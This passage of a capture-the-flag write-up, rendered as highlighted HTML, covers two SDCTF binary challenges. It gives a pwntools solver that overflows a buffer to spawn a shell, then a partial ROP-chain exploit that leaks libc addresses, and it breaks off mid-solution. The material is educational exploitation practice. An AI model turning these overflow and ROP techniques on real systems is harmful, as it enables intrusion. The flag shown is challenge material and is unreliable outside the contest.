+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./horoscope&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>binary <span style="color:#555">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([exe<span style="color:#555">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r, gdbscript<span style="color:#555">=</span><span style="color:#c30">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">            b *main+100
+</span></span></span><span style="display:flex;"><span><span style="color:#c30">            &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(<span style="color:#c30">&#34;horoscope.sdc.tf&#34;</span>, <span style="color:#f60">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#555">=</span> p64(<span style="color:#f60">0x000000000040095f</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;11/11/11&#39;</span> <span style="color:#555">+</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x30</span> <span style="color:#555">+</span>system_addr
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;horoscope</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run the solver and we will get a shell to read the flag
+<p class="markdown-image">
+  <img src="https://i.imgur.com/rDhNdBP.png" alt=""  />
+</p></p>
+<blockquote>
+<p>Flag: sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}</p>
+</blockquote>
+<h3 id="secure-horoscope">Secure-Horoscope <a href="#secure-horoscope" class="anchor">#</a></h3>
+<h4 id="initial-analysis-1">Initial Analysis <a href="#initial-analysis-1" class="anchor">#</a></h4>
+<p>We were given a binary and dockerfile. Let&rsquo;s disassemble it first.</p>
+<p><strong>main</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">main</span>(<span style="color:#078;font-weight:bold">int</span> argc,<span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> buf [<span style="color:#f60">40</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> i;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  i <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;We fixed some bugs in our last horoscope, this one should be secure!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;To get started, tell us how you feel&#34;</span>);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  fgets(buf,<span style="color:#f60">0x28</span>,stdin);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#c30">&#34;feeling like %s? That</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">s interesting.&#34;</span>,buf);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">for</span> (; i <span style="color:#555">!=</span> <span style="color:#f60">2</span>; i <span style="color:#555">=</span> i <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>    puts(
+</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#34;please put in your birthday and time in the format (month/day/year/time) and we will have y our very own horoscope</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>    fflush(stdout);
+</span></span><span style="display:flex;"><span>    getInfo();
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;want to try again?</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>    fflush(stdout);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;too bad, we don</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">t have the resources for that right now &gt;:(&#34;</span>);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Looking at the main function, it looks like main will call <code>getInfo</code> twice before exit. So far, <code>main</code> doesn&rsquo;t have any vulns that I could see. Let&rsquo;s take a look at the <code>getInfo</code>
+<strong>getInfo</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">getInfo</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> info [<span style="color:#f60">100</span>];
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  memset(info,<span style="color:#f60">0</span>,<span style="color:#f60">100</span>);
+</span></span><span style="display:flex;"><span>  read(<span style="color:#f60">0</span>,info,<span style="color:#f60">0x8c</span>);
+</span></span><span style="display:flex;"><span>  puts(info);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;hm, I</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">ll have to think about what this means. I</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">ll get back to you in 5 business days.&#34;</span>);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that there is buffer overflow vuln during read, but we can only overwrite 20-bytes at most after the function saved RBP. Let&rsquo;s checksec it first</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x400000)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, no canary! However, 20-bytes are pretty small. To leak a libc function address, AFAIK, we need to have at least 24-bytes (<code>pop_rdi + libc_got + puts_plt</code>) 😢</p>
+<p>Looking at the <code>Dockerfile</code>, we can simply build it and get the used <code>libc</code> file for the challenge in the server.</p>
+<h4 id="exploitation-plan-1">Exploitation Plan <a href="#exploitation-plan-1" class="anchor">#</a></h4>
+<p>First, with the buffer overflow, we can simply overwrite the return address of <code>getInfo</code> to <code>getInfo</code> again, so that it won&rsquo;t return to the main. This means the limitation of <code>getInfo</code> in the main (only 2 times to input) is bypassed.</p>
+<p>Second, through observation via GDB, everytime we overwrite <code>getInfo</code> return address to <code>getInfo</code> again, the new stack RSP address is increased by 8. Look at the below gdb result.
+<p class="markdown-image">
+  <img src="https://i.imgur.com/eUJVFyO.png" alt=""  />
+</p>
+During the first time we use <code>getInfo</code> the RSP just before it ret is placed on <code>0x7fff22cd8448</code>. Notice that starting from the <code>rsp+0x18</code> is our previous input during filling the how you feel question.</p>
+<p><p class="markdown-image">
+  <img src="https://i.imgur.com/ExeFcnE.png" alt=""  />
+</p>
+After overwrite the ret to <code>getInfo</code> again, notice that the RSP just before it ret is placed on <code>0x7fff22cd8450</code> (Increased by 8). And now, our input in <code>getInfo</code> got merged with our previous input in main.</p>
+<p>Based on above, our input in <code>getInfo</code> will be placed just above our previous input in <code>main</code> (during storing how you feel question). This means that our buffer overflow will be technically increased from 20-bytes only to 60-bytes <strong>after</strong> we overwrite <code>getInfo</code> ret to <code>getInfo</code> again (20-bytes + input in <code>main</code> size).</p>
+<p>From the above information, that means we can definitely leak address of any libc function. The plan is to split our ROP chain to leak the libc. The first part will be stored during <code>getInfo</code>, the second part will be stored via main.</p>
+<p>After leaking the libc, we can simply ret to <code>getInfo</code> again, and then overwrite the return pointer to system. We can use <code>one_gadget</code> to help us get the shell address.</p>
+<h4 id="solution-1">Solution <a href="#solution-1" class="anchor">#</a></h4>
+<p>Okay, so now, we need to craft our ROP chain to leak the libc address. With the help of <code>ROPGadget</code>, we can find address which will do <code>pop rdi; ret</code>. So, my ROP chain would be like this:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pop_rdi_ret + puts_got + puts_plt + getInfo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, we put the <code>puts_got</code> to <code>rdi</code>, and then call <code>puts</code>, and then return it back to <code>getInfo</code>. We need to ret it back to <code>getInfo</code> so that we can overwrite its return pointer with the system address.</p>
+<p>We split it into two parts, <code>pop_rdi_ret + puts_got</code> and <code>puts_plt + getInfo</code>. Put the second part in <code>main</code>, and put the first part into <code>getInfo</code>.</p>
+<p>First, put up the second part in main, and then overwrite the <code>getInfo</code> return pointer with <code>getInfo</code> again first.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>puts_plt <span style="color:#555">=</span> exe<span style="color:#555">.</span>plt[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>puts_got <span style="color:#555">=</span> exe<span style="color:#555">.</span>got[<span style="color:#c30">&#39;puts&#39;</span>]
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#555">=</span> <span style="color:#f60">0x0000000000400873</span> <span style="color:#09f;font-style:italic"># pop rdi; ret</span>
+</span></span><span style="display:flex;"><span>getInfo <span style="color:#555">=</span> exe<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;getInfo&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;feel</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>, p64(puts_plt)<span style="color:#555">+</span>p64(getInfo))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Ret to getInfo again</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>()
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Ret2getInfo again&#39;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(getInfo)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>sendafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;horoscope</span><span style="color:#c30;font-weight:bold">\n\n</span><span style="color:#c30">&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now, based on our observation with GDB, when we overflow the next <code>getInfo</code>, it will placed inside the program stack just above our input in the <code>main</code>. Now, put the first part to the <code>getInfo</code></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Pop puts_got to rdi, ret to puts_plt (First input, got this via observation in GDB)</span>
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>()
+</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Time to leak libc base...&#39;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#555">=</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">0x78</span> <span style="color:#555">+</span> p64(pop_rdi) <span style="color:#555">+</span> p64(puts_got) <span style="color:#09f;font-style:italic"># Because it got merged with our main input, our ROP will continue to puts_plt + getInfo</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>send(payload)
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#39;</span>)<span style="color:#555">.</span>strip()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Honestly, on my local, after executing above script, I am able to get the leaked puts libc address. However, somehow in the server, I couldn&rsquo;t do that. Instead, I need to send any string first before the server return the leaked puts libc. So, I decided to send another payload which will overwrite <code>getInfo</code> to <code>getInfo</code> again.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
